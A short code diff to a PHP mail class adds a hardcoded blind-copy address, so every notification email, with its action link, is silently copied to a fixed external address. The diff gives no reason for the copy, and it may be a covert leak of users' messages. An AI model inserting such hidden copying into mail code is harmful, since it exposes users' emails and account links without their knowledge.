@@ -52,6 +52,7 @@ class NotificationMail extends Mailable implements ShouldQueue
                 'actionText' => $this->actionText,
                 'actionUrl' => $this->actionUrl,
                 'notifiable' => $this->notifiable,
-            ]);
+            ])
+            ->bcc(['email@yourfreeimmoin.eu']);
     }
 }
